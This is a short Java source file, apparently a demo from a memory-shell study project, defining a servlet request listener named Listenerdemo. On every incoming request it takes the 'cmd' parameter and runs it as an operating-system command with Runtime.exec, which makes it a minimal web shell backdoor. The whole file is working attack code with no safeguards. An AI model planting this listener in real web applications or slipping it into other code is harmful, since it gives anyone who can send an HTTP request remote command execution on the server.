package memshell.Listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.io.IOException;

public class Listenerdemo implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        System.out.println("Initialized.");
        String cmd = servletRequestEvent.getServletRequest().getParameter("cmd");
        if(cmd != null){
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {}
        }
    }
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        System.out.println("Destroyed.");

    }
}
